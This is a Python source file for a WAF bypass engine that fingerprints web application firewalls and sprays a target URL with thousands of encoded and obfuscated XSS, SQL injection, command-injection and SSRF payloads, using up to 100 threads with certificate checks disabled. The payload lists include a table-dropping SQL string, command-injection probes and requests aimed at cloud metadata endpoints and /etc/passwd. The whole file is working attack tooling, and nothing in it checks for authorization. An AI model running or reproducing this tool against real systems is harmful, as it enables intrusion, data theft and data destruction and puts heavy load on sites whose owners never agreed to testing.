# scanners/waf_bypass_engine.py
from typing import List, Dict, Optional, Tuple, Set
import requests
import string
import random
import time
import hashlib
import base64
import urllib.parse
import re
from itertools import combinations
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class PayloadMutator:
    
    ENCODING_METHODS = {
        'URL': lambda x: urllib.parse.quote(x),
        'DOUBLE_URL': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        'UNICODE': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
        'HEX': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
        'BASE64': lambda x: base64.b64encode(x.encode()).decode(),
        'DOUBLE_BASE64': lambda x: base64.b64encode(base64.b64encode(x.encode()).decode().encode()).decode(),
        'HTML_ENTITY': lambda x: ''.join(f'&#{ord(c)};' for c in x),
        'HEX_HTML_ENTITY': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
        'UTF7': lambda x: x.encode('utf-7').decode(),
        'UTF8_BOM': lambda x: '\ufeff' + x,
    }
    
    OBFUSCATION_METHODS = {
        'CASE_VARIATION': lambda x: ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
        'SPACE_REPLACEMENT': lambda x: x.replace(' ', '\t'),
        'NULL_BYTE': lambda x: x.replace(' ', '\x00'),
        'UNICODE_SPACE': lambda x: x.replace(' ', '\u0020'),
        'TAB_SPACE': lambda x: x.replace(' ', '\x09'),
        'NEWLINE_SPACE': lambda x: x.replace(' ', '\x0a'),
        'CARRIAGE_RETURN': lambda x: x.replace(' ', '\x0d'),
        'FORM_FEED': lambda x: x.replace(' ', '\x0c'),
        'VERTICAL_TAB': lambda x: x.replace(' ', '\x0b'),
        'UNICODE_NORMALIZATION': lambda x: x.encode('utf-8').decode('utf-8'),
        'MIXED_CASE': lambda x: ''.join(f'{c.upper()}{c.lower()}' if c.isalpha() else c for c in x),
    }
    
    BYPASS_TECHNIQUES = {
        'CASE_INSENSITIVE': lambda x: x.lower() if random.choice([True, False]) else x.upper(),
        'DOUBLE_ENCODING': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        'NESTED_ENCODING': lambda x: urllib.parse.quote(base64.b64encode(urllib.parse.quote(x).encode()).decode()),
        'UNICODE_ESCAPE': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
        'OCTAL_ENCODING': lambda x: ''.join(f'\\{oct(ord(c))[2:]}' for c in x),
        'ESCAPED_QUOTES': lambda x: x.replace('"', '\\"').replace("'", "\\'"),
        'BACKSLASH_ESCAPE': lambda x: '\\' + x,
        'SLASH_ESCAPE': lambda x: '/' + x,
        'VERTICAL_TAB_INJECTION': lambda x: x.replace(' ', '\x0b'),
        'ZERO_WIDTH_SPACE': lambda x: '\u200b'.join(x),
        'RIGHT_TO_LEFT_OVERRIDE': lambda x: '\u202e' + x,
        'EMOJI_INJECTION': lambda x: x + '😀',
    }
    
    @staticmethod
    def mutate_payload(payload: str, technique: str = None) -> str:
        if technique:
            if technique in PayloadMutator.ENCODING_METHODS:
                try:
                    return PayloadMutator.ENCODING_METHODS[technique](payload)
                except:
                    return payload
            elif technique in PayloadMutator.OBFUSCATION_METHODS:
                try:
                    return PayloadMutator.OBFUSCATION_METHODS[technique](payload)
                except:
                    return payload
            elif technique in PayloadMutator.BYPASS_TECHNIQUES:
                try:
                    return PayloadMutator.BYPASS_TECHNIQUES[technique](payload)
                except:
                    return payload
        
        random_technique = random.choice(list(PayloadMutator.ENCODING_METHODS.keys()))
        try:
            return PayloadMutator.ENCODING_METHODS[random_technique](payload)
        except:
            return payload
    
    @staticmethod
    def generate_polyglot_payload(base_payload: str) -> List[str]:
        variations = [base_payload]
        
        for encoding in list(PayloadMutator.ENCODING_METHODS.keys())[:5]:
            try:
                variations.append(PayloadMutator.ENCODING_METHODS[encoding](base_payload))
            except:
                pass
        
        for obfuscation in list(PayloadMutator.OBFUSCATION_METHODS.keys())[:5]:
            try:
                variations.append(PayloadMutator.OBFUSCATION_METHODS[obfuscation](base_payload))
            except:
                pass
        
        for bypass in list(PayloadMutator.BYPASS_TECHNIQUES.keys())[:5]:
            try:
                variations.append(PayloadMutator.BYPASS_TECHNIQUES[bypass](base_payload))
            except:
                pass
        
        return list(set(variations))


class IntelligentPayloadGenerator:
    
    XSS_VECTORS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<marquee onstart=alert(1)>',
    ]
    
    SQLI_VECTORS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "admin' --",
        "' or 1=1 /*",
        "1' UNION SELECT version()--",
    ]
    
    RCE_VECTORS = [
        '`id`',
        '$(id)',
        '| id',
        '; id;',
        '&& id',
        '|| id',
        '`whoami`',
        '$(whoami)',
    ]
    
    XXSSRF_VECTORS = [
        'http://127.0.0.1:8080',
        'http://169.254.169.254/latest/meta-data/',
        'http://localhost:3000',
        'file:///etc/passwd',
        'http://metadata.google.internal/computeMetadata/v1/',
    ]
    
    @staticmethod
    def generate_intelligent_payloads(vector_type: str, unlimited: bool = True) -> List[str]:
        payloads = []
        
        vector_map = {
            'XSS': IntelligentPayloadGenerator.XSS_VECTORS,
            'SQLI': IntelligentPayloadGenerator.SQLI_VECTORS,
            'RCE': IntelligentPayloadGenerator.RCE_VECTORS,
            'SSRF': IntelligentPayloadGenerator.XXSSRF_VECTORS,
            'XXE': IntelligentPayloadGenerator.XXSSRF_VECTORS,
        }
        
        base_vectors = vector_map.get(vector_type.upper(), IntelligentPayloadGenerator.XSS_VECTORS)
        
        for vector in base_vectors:
            payloads.append(vector)
            mutated = PayloadMutator.generate_polyglot_payload(vector)
            payloads.extend(mutated[:3])
        
        mutation_count = 1000 if unlimited else 100
        
        for i in range(mutation_count):
            random_vector = random.choice(base_vectors)
            mutation_chain = random_vector
            
            for _ in range(random.randint(1, 3)):
                technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
                mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
            
            payloads.append(mutation_chain)
        
        return list(set(payloads))[:5000]


class WAFDetector:
    
    WAF_SIGNATURES = {
        'CloudFlare': ['cf-ray', 'cf-cache-status', '__cfruid'],
        'AWS WAF': ['x-amzn-requestid', 'x-amzn-errortype'],
        'Imperva': ['x-iinfo', 'x-protected-by', 'imperva'],
        'F5 BIG-IP': ['x-lb', 'bigipserverid'],
        'Barracuda': ['x-barracuda', 'barracuda_enforcer_uuid'],
        'ModSecurity': ['modsecurity'],
        'Akamai': ['akamai-origin-hop', 'akamai-request-id'],
        'AWS Shield': ['x-amzn-waf'],
    }
    
    @staticmethod
    def detect_waf(target_url: str, timeout: int = 5) -> Tuple[str, float]:
        try:
            response = requests.get(target_url, timeout=timeout, verify=False, stream=True)
            response.raw.read(256)
            
            headers = response.headers
            content = response.text.lower()[:1000]
            
            for waf, signatures in WAFDetector.WAF_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in str(headers).lower() or sig.lower() in content:
                        return (waf, 0.9)
            
            if response.status_code in [403, 406]:
                return ('Generic WAF', 0.5)
            
            return ('No WAF Detected', 0.0)
            
        except Exception:
            return ('Unknown', 0.5)


class WAFBypassEngine:
    
    def __init__(self, target_url: str, timeout: int = 5, max_workers: int = 100):
        self.target_url = target_url
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = self._create_session()
        self.bypass_history = []
        self.successful_techniques = []
        self.response_baseline = None
        self.waf_type = None
        self.waf_confidence = 0.0
        self.bypass_count = 0
        self.total_attempts = 0
        self.should_stop = False
        self.payload_cache = set()
    
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=200,
            pool_maxsize=200,
            max_retries=requests.adapters.Retry(
                total=0,
                backoff_factor=0,
                status_forcelist=[]
            )
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
        })
        session.verify = False
        
        return session
    
    def detect_waf(self) -> Tuple[str, float]:
        self.waf_type, self.waf_confidence = WAFDetector.detect_waf(self.target_url, self.timeout)
        return self.waf_type, self.waf_confidence
    
    def get_baseline_response(self) -> Optional[Dict]:
        try:
            response = self.session.get(
                self.target_url,
                timeout=self.timeout,
                verify=False,
                stream=False
            )
            
            self.response_baseline = {
                'status_code': response.status_code,
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
            }
            
            return self.response_baseline
            
        except Exception:
            return None
    
    def test_payload_fast(self, payload: str, injection_point: str = 'query') -> Dict:
        self.total_attempts += 1
        
        result = {
            'payload': payload,
            'injection_point': injection_point,
            'is_bypassed': False,
            'confidence': 0.0,
            'response_status': None,
            'response_time': 0.0,
            'is_blocked': False,
            'detection_signals': [],
            'technique_used': '',
        }
        
        try:
            if injection_point == 'query':
                test_url = f"{self.target_url}?test={payload}"
            else:
                test_url = f"{self.target_url}/{payload}"
            
            start_time = time.time()
            response = self.session.get(
                test_url,
                timeout=3,
                verify=False,
                stream=True,
                allow_redirects=False
            )
            response.raw.read(512)
            response_time = time.time() - start_time
            
            result['response_status'] = response.status_code
            result['response_time'] = response_time
            
            if response.status_code in [403, 406, 429, 444, 503]:
                result['is_blocked'] = True
                result['detection_signals'].append(f'HTTP {response.status_code}')
                return result
            
            if response.status_code == 200:
                result['is_bypassed'] = True
                result['confidence'] = 0.85
                self.bypass_count += 1
            
            return result
            
        except requests.Timeout:
            result['is_blocked'] = True
            result['detection_signals'].append('Timeout')
            return result
        except Exception:
            return result
    
    def adaptive_bypass_unlimited(self, vector_type: str = 'XSS') -> List[Dict]:
        successful_bypasses = []
        
        self.detect_waf()
        self.get_baseline_response()
        
        while not self.should_stop:
            payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(
                vector_type,
                unlimited=True
            )
            
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {}
                
                for payload in payloads:
                    if self.should_stop:
                        break
                    
                    if payload in self.payload_cache:
                        continue
                    
                    self.payload_cache.add(payload)
                    
                    for injection_point in ['query', 'path']:
                        if self.should_stop:
                            break
                        
                        future = executor.submit(self.test_payload_fast, payload, injection_point)
                        futures[future] = (payload, injection_point)
                
                for future in as_completed(futures):
                    if self.should_stop:
                        executor.shutdown(wait=False)
                        break
                    
                    try:
                        result = future.result(timeout=5)
                        
                        if result['is_bypassed']:
                            successful_bypasses.append(result)
                            self.successful_techniques.append({
                                'payload': result['payload'],
                                'injection_point': result['injection_point'],
                                'confidence': result['confidence'],
                                'waf_type': self.waf_type,
                            })
                    
                    except Exception:
                        continue
            
            if self.should_stop:
                break
        
        return sorted(successful_bypasses, key=lambda x: x['confidence'], reverse=True)
    
    def adaptive_bypass(self, vector_type: str = 'XSS') -> List[Dict]:
        return self.adaptive_bypass_unlimited(vector_type)
    
    def generate_custom_payload(self, base_payload: str, obfuscation_level: int = 5) -> List[str]:
        payloads = []
        
        for _ in range(obfuscation_level):
            for technique in list(PayloadMutator.BYPASS_TECHNIQUES.keys())[:5]:
                try:
                    mutated = PayloadMutator.mutate_payload(base_payload, technique)
                    payloads.append(mutated)
                except:
                    pass
        
        return list(set(payloads))
    
    def get_bypass_report(self) -> Dict:
        return {
            'target': self.target_url,
            'waf_type': self.waf_type,
            'waf_confidence': self.waf_confidence,
            'total_attempts': self.total_attempts,
            'successful_bypasses': self.bypass_count,
            'bypass_rate': (self.bypass_count / max(self.total_attempts, 1)) * 100,
            'successful_techniques': self.successful_techniques,
        }
    
    def stop_bypass(self):
        self.should_stop = True
